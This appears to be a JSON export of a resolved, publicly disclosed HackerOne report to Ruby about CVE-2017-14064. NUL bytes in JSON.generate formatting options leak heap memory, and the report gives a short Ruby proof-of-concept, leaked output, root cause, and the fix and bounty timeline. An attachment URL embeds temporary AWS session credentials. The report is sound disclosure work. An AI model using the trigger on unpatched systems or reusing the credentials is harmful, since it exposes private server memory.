{"id":209949,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDk5NDk=","url":"https://hackerone.com/reports/209949","title":"Arbitrary heap exposure in JSON.generate","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2017-03-01T22:55:39.657Z","submitted_at":"2017-03-01T22:55:39.657Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ahmadsherif","url":"/ahmadsherif","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":7724,"url":"https://hackerone.com/ruby","handle":"ruby","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Ruby","twitter_handle":"","website":"https://www.ruby-lang.org","about":"A Programmer's Best Friend"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2017-14064"],"singular_disclosure_disabled":false,"disclosed_at":"2017-09-25T12:32:43.247Z","bug_reporter_agreed_on_going_public_at":"2017-09-25T12:32:43.206Z","team_member_agreed_on_going_public_at":"2017-09-25T08:29:07.918Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Running this snippet can expose arbitrary memory:\n```ruby\nrequire 'json'\n\nstate = JSON.state.new\nstate.space = \"\\0\" * 1024\n\nputs JSON.generate({a: :b}, state)\n```\n\n```\n{\"a\":\npsych/handlers/recorder.rb\ntensi0\nreeze)\nGem::Specification.new do |s|\n  # to objects of the same type as the original delegate.\nmydata/scm/git/ruby/dist/lib/ruby/2.5.0/json/ext.rb\npass the namP\nSee http://guides.rubygems.org/specification-reference/ for help\n#     # constant and class member data initialization...\n\"b\"}\n```\n\n\nThe issues lies in using `strdup` in [generator.c](https://github.com/ruby/ruby/blob/trunk/ext/json/generator/generator.c#L1103), which will stop after encountering a NULL byte returning a pointer to zero length string, which is not the length stored in `space_len`. Eventually `fbuffer_append` will copy the length of the string (e.g. the 1024 above) into the generated buffer.\n\nSimpler snippets like `JSON.generate({foo: \"bar\"}, space: \"\\0\" * 1024` suffer the same issue but for slightly different reason; as `fstrndup` is using [memccpy](https://github.com/ruby/ruby/blob/trunk/ext/json/generator/generator.c#L311) which will, again, stop copying after encountering a NULL byte returning a pointer to zero length string.","vulnerability_information_html":"\u003cp\u003eRunning this snippet can expose arbitrary memory:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"nb\"\u003erequire\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;json\u0026#39;\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003estate\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003estate\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003enew\u003c/span\u003e\n\u003cspan class=\"n\"\u003estate\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003espace\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\0\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mi\"\u003e1024\u003c/span\u003e\n\n\u003cspan class=\"nb\"\u003eputs\u003c/span\u003e \u003cspan class=\"no\"\u003eJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003egenerate\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\u003cspan class=\"ss\"\u003ea: :b\u003c/span\u003e\u003cspan class=\"p\"\u003e},\u003c/span\u003e \u003cspan class=\"n\"\u003estate\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{\u0026quot;a\u0026quot;:\npsych/handlers/recorder.rb\ntensi0\nreeze)\nGem::Specification.new do |s|\n  # to objects of the same type as the original delegate.\nmydata/scm/git/ruby/dist/lib/ruby/2.5.0/json/ext.rb\npass the namP\nSee http://guides.rubygems.org/specification-reference/ for help\n#     # constant and class member data initialization...\n\u0026quot;b\u0026quot;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe issues lies in using \u003ccode\u003estrdup\u003c/code\u003e in \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fruby%2Fruby%2Fblob%2Ftrunk%2Fext%2Fjson%2Fgenerator%2Fgenerator.c%23L1103\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003egenerator.c\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, which will stop after encountering a NULL byte returning a pointer to zero length string, which is not the length stored in \u003ccode\u003espace_len\u003c/code\u003e. Eventually \u003ccode\u003efbuffer_append\u003c/code\u003e will copy the length of the string (e.g. the 1024 above) into the generated buffer.\u003c/p\u003e\n\n\u003cp\u003eSimpler snippets like \u003ccode\u003eJSON.generate({foo: \u0026quot;bar\u0026quot;}, space: \u0026quot;\\0\u0026quot; * 1024\u003c/code\u003e suffer the same issue but for slightly different reason; as \u003ccode\u003efstrndup\u003c/code\u003e is using \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fruby%2Fruby%2Fblob%2Ftrunk%2Fext%2Fjson%2Fgenerator%2Fgenerator.c%23L311\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ememccpy\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e which will, again, stop copying after encountering a NULL byte returning a pointer to zero length string.\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":2,"name":"Memory Corruption - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-10-25T08:29:07.956Z","allow_singular_disclosure_after":-100297635.76595365,"singular_disclosure_allowed":true,"vote_count":9,"voters":["flamezzz","bl4de","eveeez","r3y","apapedulimu","marwan","japz","spetr0x","achnoniod"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1514542,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Of course this isn't limited to the `space` option only, but extends to `indent`, `space_before`, `object_nl`, and `array_nl`.","markdown_message":"\u003cp\u003eOf course this isn\u0026#39;t limited to the \u003ccode\u003espace\u003c/code\u003e option only, but extends to \u003ccode\u003eindent\u003c/code\u003e, \u003ccode\u003espace_before\u003c/code\u003e, \u003ccode\u003eobject_nl\u003c/code\u003e, and \u003ccode\u003earray_nl\u003c/code\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-01T22:59:52.924Z","updated_at":"2017-03-01T22:59:52.924Z","actor":{"username":"ahmadsherif","cleared":false,"url":"/ahmadsherif","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1515329,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-02T10:47:49.556Z","updated_at":"2017-03-02T10:47:49.556Z","actor":{"username":"flori","cleared":false,"url":"/flori","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/146/939/ee67845a5dccc4fa09224b37b830c8e215173fa0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1515375,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Can you check this?","markdown_message":"\u003cp\u003eCan you check this?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-02T11:16:48.018Z","updated_at":"2017-03-02T11:16:48.018Z","actor":{"username":"flori","cleared":false,"url":"/flori","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/146/939/ee67845a5dccc4fa09224b37b830c8e215173fa0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":165606,"filename":"0001-Fix-arbitrary-heap-exposure-problem.patch","type":"text/x-diff","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/165/606/770372534ee2d357a4cfbe71b3ad2797565423a2/0001-Fix-arbitrary-heap-exposure-problem.patch?response-content-disposition=attachment%3B%20filename%3D%220001-Fix-arbitrary-heap-exposure-problem.patch%22%3B%20filename%2A%3DUTF-8%27%270001-Fix-arbitrary-heap-exposure-problem.patch\u0026response-content-type=text%2Fx-diff\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSFCZ3AEE%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045623Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJFMEMCIHWigdtf4V6jrDm66WbPrvAwAjkDkGwq6jJxHgkhTBQkAh8Pm59QJ1DW90Nm%2BqUZrqPeSIGh%2B3OcvgtVLmg10uTMKrQDCFQQARoMMDEzNjE5Mjc0ODQ5IgwfS9%2FiGaxXJhRExaMqkQM%2FioQKCRd2GEb49HBlLXjeVg1H%2FoNlCjm1k0hMZ2xM%2B0x4lmIPMnshxiw4gyq5WOKYTVNGzovcoxlJKVWJ0J8ot8jIAdBOEwL1e8YBnNwskpBMy96aUxeRhk0v3RC6PmoKg5jI4Qx3q41XFLoVNJzGZBMLXknGm%2FL%2F3r3TBQO0a%2Bho9Lw4jX%2FmwWvHj8d64twZuZ4naqUS%2FC5%2FMe%2BCb7di7nj2LrLyNCU3mwVZhuZqaKYU7%2BmpmzDXhPe6vg3i0Ag1ETmf%2B4HHFKIzD1arTf4NVMuk53Qk2BUuVm8UMmZQPvicVaLBXLt7ccHpSlZil%2FS4s09xyNkmhqsb4joFjYvki4ZCYJgj6f2HgZ9j5I5jB%2BkNBEx91sV072LTXsJZGus5vwgFqmgq6%2FLSGoCBv5WZ1%2FGuoZfgjyzvsmoBX8uKpu1MK2cCSfK2OOw%2BdQcJ893qtedMSb3E%2FljNUxJf3ge6DsNwKlGjDwu7tV2CwK5eoC8nnGnfgTFitfIQRa0%2BQ7r2Yiwaq1V%2FfpNlnllKKKKFFDD1uar%2FBTrtAcWSVbs%2BpUxv20hwqIlkNrNvMi6wkgf%2BLXOkTSYmrhZJiEvr012n0TMdj9Lpp5lSBvt%2BFmQOWfNxpY3OJBDwcWAiZ%2F2ed9lHQZ21qGQ3nsQfbuRvBliy0SDSXu3rFk%2F2YIvbptRB1WpaAx7N%2FhS0S%2Bs17TOirrod7lqA3UzbN3XBtY1r%2BegR7%2FcG%2BpTuKL1SZFmW4odML8bsKnPb2rSlOtAfW6UI5KEpZRuNPIpftSdXrAErjdLnGLehSWx7Q2Iysd3y2wS8%2BnA6TfU%2Fr7xOl0wvkOaOhwXKDLm%2BA5oHA3Mxg%2F%2FTNCq8BPNgEALt%2FQ%3D%3D\u0026X-Amz-Signature=8f8be3f31a28d443bfc70a29ced072362199bff09970718fe6eac2f79f614900"}],"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1515467,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@flori Yes, this patch seems to fix the issue.","markdown_message":"\u003cp\u003e\u003ca href=\"/flori\"\u003e@flori\u003c/a\u003e Yes, this patch seems to fix the issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-02T12:40:38.198Z","updated_at":"2017-03-02T12:40:38.198Z","actor":{"username":"ahmadsherif","cleared":false,"url":"/ahmadsherif","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1536079,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, just checking for updates on the report.","markdown_message":"\u003cp\u003eHi, just checking for updates on the report.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-12T21:07:54.893Z","updated_at":"2017-03-12T21:07:54.893Z","actor":{"username":"ahmadsherif","cleared":false,"url":"/ahmadsherif","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1604436,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I have released a fix in version 2.0.4.","markdown_message":"\u003cp\u003eI have released a fix in version 2.0.4.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-11T10:46:32.640Z","updated_at":"2017-04-11T10:46:32.640Z","actor":{"username":"flori","cleared":false,"url":"/flori","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/146/939/ee67845a5dccc4fa09224b37b830c8e215173fa0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1613531,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"I think we can close this now that the new version of JSON is released.  Thanks for reporting this @ahmadsherif ","markdown_message":"\u003cp\u003eI think we can close this now that the new version of JSON is released.  Thanks for reporting this \u003ca href=\"/ahmadsherif\"\u003e@ahmadsherif\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-15T23:05:08.452Z","updated_at":"2017-04-15T23:05:08.452Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"ahmadsherif","url":"/ahmadsherif"},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1988095,"is_internal":false,"editable":false,"type":"Activities::CveIdAdded","message":"","markdown_message":"","automated_response":false,"created_at":"2017-09-11T04:12:08.957Z","updated_at":"2017-09-11T04:12:08.957Z","cve_ids":["CVE-2017-14064"],"actor":{"username":"usa","cleared":false,"url":"/usa","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/084/616/9acacc80c98938df9ce1fbf89adaec99e9aa1e81_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2019710,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"We backported this to Ruby 2.2 and 2.3 series.","markdown_message":"\u003cp\u003eWe backported this to Ruby 2.2 and 2.3 series.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-09-25T08:28:54.750Z","updated_at":"2017-09-25T08:28:54.750Z","actor":{"url":"/ruby","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Ruby"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"ruby","collaborator":{"username":"ahmadsherif","url":"/ahmadsherif"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2019711,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-09-25T08:29:07.936Z","updated_at":"2017-09-25T08:29:07.936Z","first_to_agree":true,"actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2020447,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-09-25T12:32:43.225Z","updated_at":"2017-09-25T12:32:43.225Z","actor":{"username":"ahmadsherif","cleared":false,"url":"/ahmadsherif","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2020448,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-09-25T12:32:43.261Z","updated_at":"2017-09-25T12:32:43.261Z","actor":{"username":"ahmadsherif","cleared":false,"url":"/ahmadsherif","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}